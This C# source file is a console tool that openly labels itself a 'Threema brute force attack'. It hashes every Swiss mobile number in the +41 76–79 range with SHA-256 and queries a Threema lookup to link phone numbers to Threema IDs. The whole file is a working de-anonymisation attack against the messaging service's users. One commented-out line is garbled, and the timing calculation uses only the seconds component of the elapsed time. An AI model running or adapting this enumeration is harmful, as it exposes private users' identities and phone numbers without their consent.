using System.Diagnostics;
using System.Runtime.CompilerServices;
using utils;

namespace Hash_Threema
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Threema brute force attack");

            ThreemaLookup.init();
            // swiss mobile numbers are in the range +41 76 000 00 00 to 79 999 99 99
            uint startRange = 760000000;
            uint endRange = 799999999;
            uint numberCount = endRange - startRange;


            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();

            Console.WriteLine("starting brute force attack ...");
            Console.WriteLine("probe {0} numbers", numberCount);

            for (uint i = startRange; i <= endRange; i++)
            {
                string numberToTest = "+41" + i.ToString();
                string hash = utils.Helpers.Sha256(numberToTest);
                string result = ThreemaLookup.lookup(hash);
                if (result != "not found")
                {
                    Console.WriteLine("found {0} ID is {1}", numberToTest, result);
                }
            }
            Console.WriteLine("... brute force attack finished");
            stopwatch.Stop();
            uint numbersPerSecond = (uint) (numberCount / stopwatch.Elapsed.Seconds);
            Console.WriteLine("probed {0} numbers in {1} seconds ({2} numbers/s)", numberCount, stopwatch.Elapsed.Seconds, numbersPerSecond);

            //string hash = utils.Helpers{0} numbers in {1} seconds ({2} numbers/s., cSha256("+41781235555");
            //string result = ThreemaLookup.lookup(hash);
            //Console.WriteLine("Threema lookup: {0}", result);

            //hash = utils.Helpers.Sha256("+41781235556");
            //result = ThreemaLookup.lookup(hash);
            //Console.WriteLine("Threema lookup: {0}", result);

            //Console.ReadKey();  

        }
    }
}